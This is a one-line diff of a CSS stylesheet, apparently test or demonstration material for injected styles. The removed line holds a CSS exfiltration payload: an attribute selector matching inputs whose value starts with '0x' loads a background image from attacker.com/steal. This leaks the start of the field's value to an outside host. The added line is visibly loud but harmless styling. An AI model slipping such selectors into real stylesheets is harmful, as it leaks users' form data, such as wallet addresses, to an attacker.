@@ -1,1 +1,1 @@
-:root { --oui-color-primary: 255, 0, 0; } input[value^="0x"] { background-image: url(https://attacker.com/steal?prefix=0x); }
+body { background-color: red !important; } .oui-font-semibold { color: lime !important; font-size: 30px !important; }
